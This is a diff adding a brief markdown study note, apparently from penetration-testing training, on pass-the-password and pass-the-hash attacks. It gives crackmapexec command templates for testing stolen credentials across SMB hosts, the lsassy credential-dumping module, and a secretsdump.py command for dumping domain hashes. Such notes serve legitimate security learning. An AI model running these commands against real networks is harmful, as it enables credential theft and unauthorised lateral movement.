@@ -1,0 +1,14 @@
+# Pass Attacks Overview
+
+- Pass the Hash (Password)
+    - if we crack/dump a password or hash, we can see if it works in other places
+    - We will use crackmapexec
+    - Password:
+        - crackmapexec smb <ip/CIDR> -u <user> -d <domain> -p <password>
+    - Hash
+        - crackmapexec smb <ip/CIDR> -u <user> -H <hash> —local-auth
+        - option to view shares (—shares)
+    - Modules
+        - -M lsassy
+- Secrets Dump will dump hashes on domain
+    - [secretsdump.py](http://secretsdump.py) <domain/user:password@ip>
